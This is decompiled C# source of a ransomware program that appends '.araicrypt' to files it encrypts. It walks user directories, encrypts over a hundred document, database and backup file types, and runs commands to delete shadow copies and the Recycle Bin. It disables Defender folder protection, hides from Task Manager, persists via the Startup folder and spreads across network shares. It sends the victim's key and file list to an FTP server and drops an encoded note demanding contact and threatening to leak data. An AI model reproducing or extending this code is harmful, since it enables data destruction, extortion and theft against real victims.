using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Complex.cvew;
using Microsoft.Win32;

namespace Complex;

internal class Program
{
	public class RecursiveFileSearch
	{
		private static StringCollection log;

		private static List<string> result;

		public static List<string> SearchFiles(string rootDir)
		{
			new List<string>();
			return WalkDirectoryTree(rootDir);
		}

		private static List<string> WalkDirectoryTree(string root)
		{
			string[] array = null;
			try
			{
				array = Directory.GetFiles(root, "*.*");
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array2 = array;
				foreach (string text in array2)
				{
					try
					{
						if (!text.ToLower().Contains("program files") && !text.ToLower().Contains("windows") && !text.ToLower().Contains("perflogs") && !text.ToLower().Contains("internet explorer") && !text.ToLower().Contains("programdata") && !text.ToLower().Contains("appdata") && !text.ToLower().Contains("autoexec.bat") && !text.ToLower().Contains("desktop.ini") && !text.ToLower().Contains("autorun.inf") && !text.ToLower().Contains("ntuser.dat") && !text.ToLower().Contains("iconcache.db") && !text.ToLower().Contains("bootsect.bak") && !text.ToLower().Contains("boot.ini") && !text.ToLower().Contains("ntuser.dat.log") && !text.ToLower().Contains("thumbs.db") && !text.ToLower().Contains("bootmgr") && !text.ToLower().Contains("pagefile.sys") && !text.ToLower().Contains("config.sys") && !text.ToLower().Contains("ntuser.ini") && !text.Contains(Base64Decode("QnVpbGRlcl9Mb2c=")) && !text.Contains("RSAKeys") && !text.Contains("READ_TO_RESTORE_YOUR_FILES") && !text.EndsWith(".araicrypt") && !text.EndsWith("exe") && !text.EndsWith("dll") && !text.EndsWith("EXE") && !text.EndsWith("DLL") && !text.ToLower().Contains("Recycle.Bin") && !text.ToLower().Contains(MyStartName))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(Mb) * 1024.0 * 1024.0 && Size == "YES")
							{
								result.Add(text);
							}
							else if (File.Exists(text) && Size == "NO")
							{
								result.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				string[] directories = Directory.GetDirectories(root);
				for (int j = 0; j < directories.Length; j++)
				{
					WalkDirectoryTree(directories[j]);
				}
			}
			return result;
		}

		static RecursiveFileSearch()
		{
			log = new StringCollection();
			result = new List<string>();
		}
	}

	public class Ajout
	{
		public static string m000003(string p0)
		{
			byte[] bytes = Convert.FromBase64String(p0);
			return Encoding.UTF8.GetString(bytes);
		}

		public static void RegModify(string p0, string KIIbYrKbucelZ, string OFNVwgWVfswlvJj)
		{
			p0 = "U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cV2lubG9nb24=";
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(m000003(p0), writable: true);
				if (registryKey != null)
				{
					registryKey.SetValue("LegalNoticeCaption", m000003(KIIbYrKbucelZ));
					registryKey.SetValue("LegalNoticeText", m000003(OFNVwgWVfswlvJj));
					registryKey.Close();
				}
			}
			catch
			{
			}
			try
			{
				p0 = "U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVt";
				RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey(m000003(p0), writable: true);
				if (registryKey2 != null)
				{
					registryKey2.SetValue("legalnoticecaption", m000003(KIIbYrKbucelZ));
					registryKey2.SetValue("legalnoticetext", m000003(OFNVwgWVfswlvJj));
					registryKey2.Close();
				}
			}
			catch
			{
			}
		}

		public static void Notif()
		{
			try
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					if (NotifyCustom == "YES" && !string.IsNullOrEmpty(LegalTitle) && !string.IsNullOrEmpty(LegalText))
					{
						RegModify("", LegalTitle, LegalText);
					}
					else
					{
						RegModify("", "SW5mb3JtYXRpb24uLi4=", "QWxsIHlvdXIgZmlsZXMgYXJlIHNlY3VyZWQsIHBsZWFzZSByZWFkIHRoZSB0ZXh0IG5vdGUgbG9jYXRlZCBpbiB5b3VyIGRlc2t0b3AuLi4=");
					}
				}
			}
			catch
			{
			}
		}
	}

	public static string imha;

	public static string[] files_;

	public static IEnumerable<DirectoryInfo> dirs;

	public static byte[] PasswordBytes;

	public static DirectoryInfo di;

	public static string Size;

	public static string Mb;

	public static List<string> DizonList;

	public static List<string> DoneExtensions;

	public static string Persistence;

	public static string DynamicPass;

	public static string DeceiveMe;

	public static int rand;

	public static string ReleaseLockedFiles;

	public static string AntiVM;

	public static string Delay;

	public static string DelayTime;

	public static string DisableDefender;

	public static string DisableAMSI;

	public static string CriticalProcess;

	public static string WallpaperChanger;

	public static List<string> meltList;

	public static List<string> EncryptedDirs;

	public static string SpreadOverNetwork;

	public static string Live4Ever;

	public static string KillTM;

	public static List<string> EncryptedFiles;

	public static string FtpLog;

	private static string appGuid;

	public static string MultipleThreads;

	public static string WoL;

	public static List<string> netShadowList;

	public static List<string> scList;

	public static List<string> taskList;

	public static List<string> vssList;

	public static List<string> delList;

	public static string DelayedActivation;

	public static string ExpireOption;

	internal static DateTime ActiveAfterDateTime;

	internal static DateTime ExpireAfterDateTime;

	public static string PartialEncrytion;

	public static string PartialSize;

	public static string StaticLooks;

	public static string SystemFiles;

	public static string RIPmeBiot;

	public static string ADMINISTRATOR;

	public static string FAC;

	public static string Styler;

	public static List<string> extstyl;

	public static string LimitMe;

	public static string MaxSize;

	public static string TransparentMan;

	public static string AlternateAlgo;

	public static string Jerry;

	public static string toolLocation;

	public static string Drag_Drop;

	public static string NotifyMe;

	public static string NotifyCustom;

	public static string LegalTitle;

	public static string LegalText;

	public static string Upper;

	public static string LANShares;

	public static string ProcessAll;

	public static string ReleaseAllFiles;

	public static string FixMBR;

	public static string LogonPass;

	public static string VeryBasicMode;

	public static string HorseMount;

	public static string MyStartName;

	public static string SkipC;

	public static string CatchDrv;

	public static string RichText;

	public static string CredActivate;

	public static string MySign;

	public static string Sniffing;

	public static string Blocks;

	[DllImport("kernel32.dll")]
	private static extern bool DefineDosDevice(uint dwFlags, string lpDeviceName, string lpTargetPath);

	[DllImport("kernel32.dll")]
	private static extern bool DeleteVolumeMountPoint(string lpszVolumeMountPoint);

	[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	internal static extern bool MoveFileExW(string lpExistingFileName, string lpNewFileName, uint dwFlags);

	private static void Main(string[] args)
	{
		try
		{
			MutexHelper.CheckMutex(appGuid);
		}
		catch (Exception)
		{
		}
		try
		{
			if (Sniffing == "YES")
			{
				Thread thread = new Thread(AntiSniffer.SniffersKiller);
				thread.Priority = ThreadPriority.Lowest;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (Delay == "YES")
		{
			Thread.Sleep(int.Parse(DelayTime));
		}
		if (TransparentMan == "YES")
		{
			try
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					string[] processesToCheck = new string[4]
					{
						Base64Decode("VGFza21ncg=="),
						Base64Decode("dGFza21ncg=="),
						Base64Decode("UHJvY2Vzc0hhY2tlcg=="),
						Base64Decode("cHJvY2V4cA==")
					};
					Thread thread2 = new Thread((ThreadStart)delegate
					{
						Rootkit.WaitForProcess(processesToCheck);
					});
					thread2.IsBackground = true;
					thread2.Start();
				}
			}
			catch
			{
			}
			try
			{
				ROOT1.HookApplication(Base64Decode("dGFza21ncg=="));
			}
			catch
			{
			}
			try
			{
				ROOT1.HookApplication(Base64Decode("cHJvY2V4cA=="));
			}
			catch
			{
			}
			try
			{
				ROOT1.HookApplication(Base64Decode("cHJvY2V4cDY0"));
			}
			catch
			{
			}
			try
			{
				ROOT1.HookApplication(Base64Decode("UHJvY2Vzc0hhY2tlcg=="));
			}
			catch
			{
			}
			Thread thread3 = new Thread(Rootkit.Hide);
			thread3.IsBackground = true;
			thread3.Start();
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && FAC == "YES")
		{
			try
			{
				RunPS(Base64Decode("U2V0LU1wUHJlZmVyZW5jZSAtRW5hYmxlQ29udHJvbGxlZEZvbGRlckFjY2VzcyBEaXNhYmxlZA=="));
			}
			catch
			{
			}
		}
		if (CriticalProcess == "YES" && !ProcessCritical.IsAdmin())
		{
			ProcessCritical.YesItIs();
		}
		if (Live4Ever == "YES" && ProcessCritical.IsAdmin())
		{
			new AntiKill().DisTaskManager(enable: false);
			new AntiKill().IamInmortal();
		}
		if (AntiVM == "YES")
		{
			Anti_Analysis.RunAntiAnalysis();
		}
		ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
		string fileName = mainModule.FileName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\";
		string text2 = text + Path.GetFileName(fileName);
		if (DeceiveMe == "YES" && fileName != text2)
		{
			Thread thread4 = new Thread(Deceive);
			thread4.IsBackground = true;
			thread4.Priority = ThreadPriority.Highest;
			thread4.Start();
		}
		if (Persistence == "YES" && mainModule != null && fileName != text2)
		{
			try
			{
				rand = NextInt(0, meltList.Count);
				File.Copy(fileName, text + meltList[rand], overwrite: true);
				Process.Start(text + meltList[rand]);
				CleanMyStuff();
				Process.GetCurrentProcess().Kill();
			}
			catch (Exception)
			{
			}
		}
		try
		{
			if (DelayedActivation == "YES" && DateTime.Now < ActiveAfterDateTime)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (ExpireOption == "YES" && DateTime.Now > ExpireAfterDateTime)
			{
				CleanMyStuff();
			}
		}
		catch
		{
		}
		foreach (string netShadow in netShadowList)
		{
			ProcessCommand("net.exe", netShadow);
		}
		foreach (string sc in scList)
		{
			ProcessCommand("sc.exe", sc);
		}
		foreach (string task in taskList)
		{
			ProcessCommand("taskkill.exe", task);
		}
		foreach (string vss in vssList)
		{
			ProcessCommand(Base64Decode("dnNzYWRtaW4uZXhl"), vss);
		}
		foreach (string del in delList)
		{
			ProcessCommand(Base64Decode("ZGVsLmV4ZQ=="), del);
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			ProcessCommand("cmd.exe", "/c rd /s /q %SYSTEMDRIVE%\\$Recycle.bin");
		}
		if (SpreadOverNetwork == "YES" && Internet() && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			Thread thread5 = new Thread(NetworkSpreading.Run);
			thread5.IsBackground = true;
			thread5.Start();
		}
		if (NotifyMe == "YES")
		{
			Ajout.Notif();
		}
		_ = WoL == "YES";
		if (StaticLooks == "NO")
		{
			DynamicPass = Crypto.RandomString(32);
		}
		else
		{
			DynamicPass = Crypto.RandomString(32);
		}
		string text3 = CryptographyHelper.Encrypt(DynamicPass);
		Shortcut.Create(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), MyStartName), LeaveRegards(text3), null, null, "Installer...", "Ctrl+Shift+X", null);
		if (LANShares == "YES")
		{
			try
			{
				MapDrv();
			}
			catch
			{
			}
		}
		try
		{
			Crypt(new string[1] { "[auto]" }, new string[113]
			{
				"bco", "one", "dat", "txt", "vib", "vbm", "vbk", "xll", "jpeg", "gif",
				"lst", "tbl", "cdx", "log", "fpt", "jpg", "png", "php", "cs", "cpp",
				"rar", "zip", "html", "htm", "xlsx", "xls", "avi", "mp4", "ppt", "doc",
				"docx", "sxi", "sxw", "odt", "hwp", "tar", "bz2", "mkv", "eml", "msg",
				"ost", "pst", "edb", "sql", "accdb", "mdb", "dbf", "odb", "myd", "php",
				"java", "cpp", "pas", "asm", "key", "pfx", "pem", "p12", "csr", "gpg",
				"aes", "vsd", "odg", "raw", "nef", "svg", "psd", "vmx", "vmdk", "vdi",
				"lay6", "sqlite3", "sqlitedb", "accdb", "java", "class", "mpeg", "djvu", "tiff", "backup",
				"pdf", "cert", "docm", "xlsm", "dwg", "bak", "qbw", "nd", "tlg", "lgb",
				"pptx", "mov", "xdw", "ods", "wav", "mp3", "aiff", "flac", "m4a", "csv",
				"sql", "ora", "mdf", "ldf", "ndf", "dtsx", "rdl", "dim", "mrimg", "qbb",
				"rtf", "one", "7z"
			}, new string[0], DynamicPass, ".araicrypt");
		}
		catch
		{
		}
		DynamicPass = Crypto.RandomString(32);
		if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\READ_TO_RESTORE_YOUR_FILES.txt"))
		{
			using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\READ_TO_RESTORE_YOUR_FILES.txt");
			streamWriter.WriteLine(Base64Decode("PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CkFsbCBZb3VyIEZpbGVzIEhhdmUgQmVlbiBFbmNyeXB0ZWQgISEKPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CkFsbCBvZiB5b3VyIGJhY2t1cHMgYW5kIHNoYWRvdyBjb3BpZXMgaGF2ZSBhbHNvIGJlZW4gZGVsZXRlZCBzbyBmb3JnZXQgcmVzdG9yaW5nIAp0aGVtLgo9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KV2UgYWxzbyBoYXZlIGJlZW4gYWJsZSB0byBzdGVhbCB5b3VyIGNvbmZpZGVudGlhbCBmaWxlcyAoZGF0YWJhc2VzLCBjdXN0b21lcnMgZGF0YSdzLApIUiBldGMuLi4pIGFsbCBvdmVyIHlvdXIgbmV0d29yayB3b3Jrc3RhdGlvbnMgYW5kIHNlcnZlcnMuCj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KSWYgeW91IHdhbnQgdG8gaGVhciB5b3VyIG1pbmQgaW5zdGVhZCBvZiBvdXIgaW5zdHJ1Y3Rpb25zLCB5b3Ugd2lsbCBsb29zZSBzdHVwaWRseSB5b3VyCmZpbGVzIGJ1dCB5b3Ugd2lsbCBhbHNvIHNlZSB5b3VyIGZpbGVzIGJlaW5nIHB1Ymxpc2hlZCBvbmxpbmUgb3Igc2VsbCB0byB0aWVycyAoYW5kIHdlJ2xsIGRvIGl0KQoKSW4gdGhpcyBjYXNlLCBiZWxlaXZlIHVzIHRoYXQgeW91J3JlIGdvaW5nIHRvIHN1ZmZlciBhIGJpZyBmaW5hbmNpYWwgbG9zcyBhbmQgYSBiaWcgbG9zcwpvZiByZXB1dGF0aW9uLgo9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CldlIGFyZSBhd2FyZSB0aGF0IHlvdSBkb24ndCB3YW50IHRoaXMgY2FzZSB0b28gaGFwcGVucy4KCklmIHlvdSB3YW50IHRvIHJlc3RvcmUgZmlsZXMgYW5kIHdhbnQgdXMgdG8gZGVsZXRlIHlvdXIgY29uZmlkZW50aWFscyBmaWxlcywgY29udGFjdCB1cyByaWdodAp3aXRoIGEgbWVzc2FnZSB0byB0aGUgY29udGFjdCBhZGRyZXNzIGJlbG93LiBJbmNsdWRlIHRoZSBLZXlJRCBpbiB5b3VyIG1lc3NhZ2UgcGxzLgo9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CkFyYWlIZWxwQHNlY21haWwucHJvCgpJZiB0aGVyZSdzIG5vIGFuc3dlcnMgZnJvbSB1cyBpbiB0aGUgbmV4dCAxNSBob3VycywgY29udGFjdCB1cyB0byA6CgpBcmFpSGVscDJAc2VjbWFpbC5wcm8KCk5vdGUgdGhhdCB5b3UgaGF2ZSBvbmx5IDQ4IGhvdXJzIHRvIGNvbnRhY3QgdXMuIEFmdGVyIHRoaXMgZGVsYXksIHRoZXJlIHdpbGwgYmUgbm8gZGF0YQpyZWNvdmVyZWQgYW5kIHlvdXIgZmlsZXMgd2lsbCBiZSBwdWJsaXNoZWQu"));
			streamWriter.WriteLine("\r\n");
			streamWriter.WriteLine(Base64Decode("S2V5IElkZW50aWZpZXI6IA=="));
			streamWriter.WriteLine(text3);
			if (MultipleThreads == "NO")
			{
				streamWriter.WriteLine("\r\n");
				streamWriter.WriteLine(Base64Decode("TnVtYmVyIG9mIGZpbGVzIHRoYXQgd2VyZSBwcm9jZXNzZWQgaXM6IA==") + Convert.ToString(EncryptedFiles.Count));
			}
		}
		else
		{
			File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\READ_TO_RESTORE_YOUR_FILES.txt", "\r\nAditional KeyId:\r\n" + text3);
		}
		foreach (string encryptedDir in EncryptedDirs)
		{
			if (encryptedDir == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
			{
				continue;
			}
			try
			{
				if (!File.Exists(encryptedDir + "\\READ_TO_RESTORE_YOUR_FILES.txt"))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\READ_TO_RESTORE_YOUR_FILES.txt", encryptedDir + "\\READ_TO_RESTORE_YOUR_FILES.txt", overwrite: true);
				}
				else
				{
					File.AppendAllText(encryptedDir + "\\READ_TO_RESTORE_YOUR_FILES.txt", "\r\nAditional KeyId:\r\n" + text3);
				}
			}
			catch (Exception)
			{
			}
		}
		if (RichText == "YES")
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\READ_TO_RESTORE_YOUR_FILES.hta"))
			{
				using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\READ_TO_RESTORE_YOUR_FILES.hta");
				streamWriter2.WriteLine(Base64Decode("MESSAGERICH"));
				streamWriter2.WriteLine("\r\n");
				streamWriter2.WriteLine(Base64Decode("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPktleSBJZGVudGlmaWVyOiA="));
				streamWriter2.WriteLine(text3 + Base64Decode("PC9wPg=="));
				if (MultipleThreads == "NO")
				{
					streamWriter2.WriteLine("\r\n");
					streamWriter2.WriteLine(Base64Decode("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPg==") + Base64Decode("TnVtYmVyIG9mIGZpbGVzIHRoYXQgd2VyZSBwcm9jZXNzZWQgaXM6IA==") + Convert.ToString(EncryptedFiles.Count) + Base64Decode("PC9wPg=="));
				}
			}
			else
			{
				File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\READ_TO_RESTORE_YOUR_FILES.hta", Base64Decode("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPg==") + "\r\nAditional KeyId:\r\n" + text3 + Base64Decode("PC9wPg=="));
			}
		}
		if (FtpLog == "YES")
		{
			try
			{
				if (MultipleThreads == "NO")
				{
					string ftpUsername = "USERNAME";
					string ftpPassword = "ACCESO";
					string[] array = new string[14];
					array[0] = Base64Decode("Q2xpZW50IElQOiAg");
					array[1] = new WebClient().DownloadString(Base64Decode("aHR0cDovL2ljYW5oYXppcC5jb20="));
					array[2] = Base64Decode("RGF0ZSBvZiBlbmNyeXB0aW9uOiA=");
					array[3] = default(DateTime).Date.ToString();
					array[4] = "\r\n";
					array[5] = Base64Decode("TnVtYmVyIG9mIGZpbGVzIGVuY3J5cHRlZDog");
					array[6] = Convert.ToString(EncryptedFiles.Count);
					array[7] = "\r\n";
					array[8] = Base64Decode("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA==");
					array[9] = "\r\n";
					array[10] = Convert.ToString(EncryptedFiles);
					array[11] = "\r\n";
					array[12] = Base64Decode("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog");
					array[13] = "\r\n";
					array[14] = Base64Decode("Q2xpZW50IFBhc3M6");
					array[15] = "\r\n";
					array[16] = Convert.ToString(DynamicPass);
					array[17] = text3;
					UtilMe.Send("URL", ftpUsername, ftpPassword, string.Concat(array));
				}
				else
				{
					string ftpUsername2 = "USERNAME";
					string ftpPassword2 = "ACCESO";
					string[] array2 = new string[11];
					array2[0] = Base64Decode("Q2xpZW50IElQOiAg");
					array2[1] = new WebClient().DownloadString("aHR0cDovL2ljYW5oYXppcC5jb20=");
					array2[2] = Base64Decode("RGF0ZSBvZiBlbmNyeXB0aW9uOiA=");
					array2[3] = default(DateTime).Date.ToString();
					array2[4] = "\r\n";
					array2[5] = Base64Decode("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA==");
					array2[6] = "\r\n";
					array2[7] = Convert.ToString(EncryptedFiles);
					array2[8] = "\r\n";
					array2[9] = Base64Decode("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog");
					array2[10] = "\r\n";
					array2[11] = Base64Decode("Q2xpZW50IFBhc3M6");
					array2[12] = "\r\n";
					array2[13] = Convert.ToString(DynamicPass);
					array2[14] = text3;
					UtilMe.Send("URL", ftpUsername2, ftpPassword2, string.Concat(array2));
				}
			}
			catch
			{
			}
		}
		if (WallpaperChanger == "YES")
		{
			try
			{
				Wallpaper.Set(new Uri(""));
			}
			catch
			{
			}
		}
		if (RichText == "NO")
		{
			if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\READ_TO_RESTORE_YOUR_FILES.txt"))
			{
				Process.Start(Base64Decode("bm90ZXBhZC5leGU="), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\READ_TO_RESTORE_YOUR_FILES.txt");
			}
		}
		else if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\READ_TO_RESTORE_YOUR_FILES.hta"))
		{
			Process.Start(Base64Decode("bXNodGEuZXhl"), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\READ_TO_RESTORE_YOUR_FILES.hta");
		}
		if (!string.IsNullOrEmpty(toolLocation))
		{
			try
			{
				File.Delete(toolLocation);
			}
			catch
			{
			}
		}
		if (imha == "EVET")
		{
			CleanMyStuff();
		}
	}

	public static void Deceive()
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(Base64Decode("VGhpcyBwcm9ncmFtIHJlcXVpcmVzIE1pY3Jvc29mdCAuTkVUIEZyYW1ld29yayB2LiA0LjgyIG9yIHN1cGVyaW9yIHRvIHJ1biBwcm9wZXJseQ=="), Base64Decode("QXRlbnRpb24h"), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int NextInt(int min, int max)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		return new Random(BitConverter.ToInt32(array, 0)).Next(min, max);
	}

	public static List<string> TraverseTree(string root, string[] extensions, string extension, string[] excluded, string DynamicPass)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(root);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.ToLower().Contains("program files") && !text.ToLower().Contains("windows") && !text.ToLower().Contains("perflogs") && !text.ToLower().Contains("internet explorer") && !text.ToLower().Contains("programdata") && !text.ToLower().Contains("appdata"))
				{
					array = Directory.GetFiles(text);
					goto IL_00b4;
				}
			}
			catch
			{
			}
			continue;
			IL_00b4:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains("autoexec.bat") && !fileInfo.FullName.Contains("desktop.ini") && !fileInfo.FullName.Contains("autorun.inf") && !fileInfo.FullName.Contains("ntuser.dat") && !fileInfo.FullName.Contains("iconcache.db") && !fileInfo.FullName.Contains("bootsect.bak") && !fileInfo.FullName.Contains("boot.ini") && !fileInfo.FullName.Contains("ntuser.dat.log") && !fileInfo.FullName.Contains("thumbs.db") && !fileInfo.FullName.ToLower().Contains("bootmgr") && !fileInfo.FullName.ToLower().Contains("pagefile.sys") && !fileInfo.FullName.ToLower().Contains("config.sys") && !fileInfo.FullName.ToLower().Contains("ntuser.ini") && !fileInfo.FullName.Contains(Base64Decode("QnVpbGRlcl9Mb2c=")) && !fileInfo.FullName.Contains("RSAKeys") && !fileInfo.FullName.Contains("READ_TO_RESTORE_YOUR_FILES") && !fileInfo.FullName.EndsWith(".araicrypt") && !fileInfo.FullName.EndsWith("exe") && !fileInfo.FullName.EndsWith("dll") && !fileInfo.FullName.EndsWith("EXE") && !fileInfo.FullName.EndsWith("DLL") && !fileInfo.FullName.Contains("Recycle.Bin") && !fileInfo.FullName.Contains(MyStartName))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(Mb) * 1024.0 * 1024.0 && Size == "YES")
						{
							list.Add(fileInfo.FullName);
							WorkerCrypter2(list, extensions, extension, excluded, DynamicPass);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && Size == "NO")
						{
							list.Add(fileInfo.FullName);
							WorkerCrypter2(list, extensions, extension, excluded, DynamicPass);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			array2 = directories;
			foreach (string item in array2)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static List<string> GetFilesList(string docPath)
	{
		List<string> list = new List<string>();
		DirectoryInfo directoryInfo = new DirectoryInfo(docPath);
		try
		{
			foreach (FileInfo item in directoryInfo.EnumerateFiles())
			{
				try
				{
					if (!item.FullName.ToLower().Contains("program files") && !item.FullName.ToLower().Contains("windows") && !item.FullName.ToLower().Contains("perflogs") && !item.FullName.ToLower().Contains("internet explorer") && !item.FullName.ToLower().Contains("programdata") && !item.FullName.ToLower().Contains("appdata") && !item.FullName.ToLower().Contains("autoexec.bat") && !item.FullName.ToLower().Contains("desktop.ini") && !item.FullName.ToLower().Contains("autorun.inf") && !item.FullName.ToLower().Contains("ntuser.dat") && !item.FullName.ToLower().Contains("iconcache.db") && !item.FullName.ToLower().Contains("bootsect.bak") && !item.FullName.ToLower().Contains("boot.ini") && !item.FullName.ToLower().Contains("ntuser.dat.log") && !item.FullName.ToLower().Contains("thumbs.db") && !item.FullName.ToLower().Contains("bootmgr") && !item.FullName.ToLower().Contains("pagefile.sys") && !item.FullName.ToLower().Contains("config.sys") && !item.FullName.ToLower().Contains("ntuser.ini") && !item.FullName.Contains(Base64Decode("QnVpbGRlcl9Mb2c=")) && !item.FullName.Contains("RSAKeys") && !item.FullName.Contains("READ_TO_RESTORE_YOUR_FILES") && !item.FullName.EndsWith(".araicrypt") && !item.FullName.EndsWith("exe") && !item.FullName.EndsWith("dll"))
					{
						if (File.Exists(item.FullName) && (double)item.Length <= double.Parse(Mb) * 1024.0 * 1024.0 && Size == "YES")
						{
							list.Add(item.FullName);
						}
						else if (File.Exists(item.FullName) && Size == "NO")
						{
							list.Add(item.FullName);
						}
					}
				}
				catch (UnauthorizedAccessException)
				{
				}
				catch
				{
				}
			}
			foreach (DirectoryInfo item2 in directoryInfo.EnumerateDirectories("*"))
			{
				if (directoryInfo.FullName.ToLower().Contains("program files") || directoryInfo.FullName.ToLower().Contains("windows") || directoryInfo.FullName.ToLower().Contains("perflogs") || directoryInfo.FullName.ToLower().Contains("internet explorer") || directoryInfo.FullName.ToLower().Contains("programdata") || directoryInfo.FullName.ToLower().Contains("appdata"))
				{
					continue;
				}
				try
				{
					foreach (FileInfo item3 in item2.EnumerateFiles("*", SearchOption.AllDirectories))
					{
						try
						{
							if (!item3.FullName.ToLower().Contains("autoexec.bat") && !item3.FullName.ToLower().Contains("desktop.ini") && !item3.FullName.ToLower().Contains("autorun.inf") && !item3.FullName.ToLower().Contains("ntuser.dat") && !item3.FullName.ToLower().Contains("iconcache.db") && !item3.FullName.ToLower().Contains("bootsect.bak") && !item3.FullName.ToLower().Contains("boot.ini") && !item3.FullName.ToLower().Contains("ntuser.dat.log") && !item3.FullName.ToLower().Contains("thumbs.db") && !item3.FullName.ToLower().Contains("bootmgr") && !item3.FullName.ToLower().Contains("pagefile.sys") && !item3.FullName.ToLower().Contains("config.sys") && !item3.FullName.ToLower().Contains("ntuser.ini") && !item3.FullName.Contains(Base64Decode("QnVpbGRlcl9Mb2c=")) && !item3.FullName.Contains("RSAKeys") && !item3.FullName.Contains("READ_TO_RESTORE_YOUR_FILES") && !item3.FullName.EndsWith(".araicrypt") && !item3.FullName.EndsWith("exe") && !item3.FullName.EndsWith("dll"))
							{
								if (File.Exists(item3.FullName) && (double)item3.Length <= double.Parse(Mb) * 1024.0 * 1024.0 && Size == "YES")
								{
									list.Add(item3.FullName);
								}
								else if (File.Exists(item3.FullName) && Size == "NO")
								{
									list.Add(item3.FullName);
								}
							}
						}
						catch (UnauthorizedAccessException)
						{
						}
						catch
						{
						}
					}
				}
				catch (UnauthorizedAccessException)
				{
				}
				catch
				{
				}
			}
			return list;
		}
		catch (DirectoryNotFoundException)
		{
			return list;
		}
		catch (UnauthorizedAccessException)
		{
			return list;
		}
		catch (PathTooLongException)
		{
			return list;
		}
		catch
		{
			return list;
		}
	}

	public static string ProcessCommand(string command = "", string arguments = "")
	{
		string result = "";
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = command,
				Arguments = arguments,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
